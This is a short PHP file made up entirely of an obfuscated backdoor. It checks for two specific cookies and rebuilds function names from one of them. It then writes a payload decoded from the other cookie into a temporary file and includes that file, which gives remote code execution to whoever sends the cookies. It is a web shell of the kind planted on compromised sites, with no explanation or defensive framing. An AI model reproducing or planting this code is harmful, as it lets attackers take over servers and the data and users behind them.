<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[38])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 6;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[38][$n];
        if (!$c[38][$n + 1]) {
            if (!$c[38][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 6 + 1;
    }
    $k = $p[22]() . $p[4];
    if (!$p[29]($k)) {
        $n = $p[23]($k, $p[5]);
        $p[28]($n, $p[18] . $p[9]($p[21]($c[3])));
    }
    include($k);
}